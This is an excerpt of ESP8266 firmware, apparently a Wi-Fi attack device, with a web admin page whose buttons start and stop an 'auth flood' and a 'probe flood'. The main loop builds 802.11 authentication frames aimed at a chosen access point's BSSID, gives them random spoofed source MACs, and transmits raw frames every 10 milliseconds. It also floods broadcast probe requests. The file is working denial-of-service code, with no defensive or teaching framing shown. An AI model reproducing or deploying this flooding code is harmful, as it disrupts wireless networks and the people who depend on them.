...
bool auth_flood_active = false;
bool rand_beacon_active = false;
bool probe_flood_active = false;
...
void handleArgs() {
  ...
  if (webServer.hasArg("authflood")) {
    if (webServer.arg("authflood") == "start") {
      auth_flood_active = true;
      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Starting Auth Flood...</h2><p style='color:#777;'>Firing packets in background...</p></body></html>");
      return;
    } else if (webServer.arg("authflood") == "stop") {
      auth_flood_active = false;
    }
  }
  ...
  if (webServer.hasArg("probeflood")) {
    if (webServer.arg("probeflood") == "start") {
      probe_flood_active = true;
    } else if (webServer.arg("probeflood") == "stop") {
      probe_flood_active = false;
    }
  }
...
String buildAdminPage() {
    ...
    if (auth_flood_active) {
      _html.replace("{auth_button}", "STOP AUTHFLOOD");
      _html.replace("{authflood}", "stop");
      _html.replace("{auth_class}", "red");
    } else {
      _html.replace("{auth_button}", "START AUTHFLOOD");
      _html.replace("{authflood}", "start");
      _html.replace("{auth_class}", "green");
    }
    ...
    if (probe_flood_active) {
      _html.replace("{probe_button}", "STOP PROBE FLOOD");
      _html.replace("{probeflood}", "stop");
      _html.replace("{probe_class}", "red");
    } else {
      _html.replace("{probe_button}", "START PROBE FLOOD");
      _html.replace("{probeflood}", "start");
      _html.replace("{probe_class}", "green");
    }
...
unsigned long auth_now = 0;
unsigned long rand_beacon_now = 0;
unsigned long probe_now = 0;
...
void loop() {
  ...
  if (auth_flood_active && millis() - auth_now >= 10) {
    uint8_t old_ch = wifi_get_channel();
    if (old_ch != _selectedNetwork.ch) wifi_set_channel(_selectedNetwork.ch);
    ...
    memcpy(&authPacket[4], _selectedNetwork.bssid, 6);
    memcpy(&authPacket[16], _selectedNetwork.bssid, 6);
    
    // Generate Random MAC for Source
    authPacket[10] = random(256);
    authPacket[11] = random(256);
    authPacket[12] = random(256);
    authPacket[13] = random(256);
    authPacket[14] = random(256);
    authPacket[15] = random(256);
    authPacket[10] &= 0xFE; 

    wifi_send_pkt_freedom(authPacket, sizeof(authPacket), 0);
    
    if (old_ch != _selectedNetwork.ch) wifi_set_channel(old_ch);
    auth_now = millis();
  }
  ...
  if (probe_flood_active && millis() - probe_now >= 10) {
    uint8_t probePacket[32] = {
      0x40, 0x00, 0x00, 0x00,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
    ...
    wifi_send_pkt_freedom(probePacket, 32, 0);
    probe_now = millis();
  }
